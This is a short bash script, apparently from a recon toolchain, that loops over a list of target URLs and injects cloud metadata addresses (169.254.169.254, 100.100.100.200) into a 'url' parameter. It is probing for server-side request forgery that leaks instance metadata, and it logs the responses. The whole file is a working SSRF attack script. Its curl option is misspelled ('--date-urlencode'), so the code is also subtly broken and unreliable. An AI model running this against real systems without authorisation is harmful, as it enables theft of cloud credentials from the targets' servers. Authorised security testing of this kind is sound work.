#!/bin/bash
OUT=$1
mkdir -p $OUT/cloudmeta
META_IPS=("169.254.169.254" "100.100.100.200")

while read url; do
	for ip in "${META_IPS[@]}"; do
		curl -s -G --date-urlencode "url=http://$ip/latest/meta-data/" "$url" >> $OUT/cloudmeta/ssrf-results.txt
	done
done < $OUT/params/all-urls.txt
